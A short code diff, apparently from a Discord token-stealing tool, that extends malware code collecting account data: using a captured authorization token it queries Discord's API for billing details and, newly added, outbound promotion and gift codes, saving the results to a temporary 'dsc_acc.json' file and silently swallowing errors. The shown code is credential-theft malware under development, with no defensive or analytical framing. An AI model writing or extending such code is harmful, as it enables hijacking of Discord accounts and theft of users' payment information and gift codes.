@@ -98,7 +98,18 @@ Object.keys(paths).forEach(path => {
           const json = res.data;
           let info = require(join(tempFolder, 'dsc_acc.json'));
           info.billing = json;
-          console.log(info);
+          writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
+        })
+        .catch(() => {});
+
+      await axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
+        headers: { Authorization: token }
+      })
+        .then(res => {
+          if (res.status !== 200) return;
+          const json = res.data;
+          let info = require(join(tempFolder, 'dsc_acc.json'));
+          info.gifts = json;
           writeFileSync(join(tempFolder, 'dsc_acc.json'), JSON.stringify(info));
         })
         .catch(() => {});
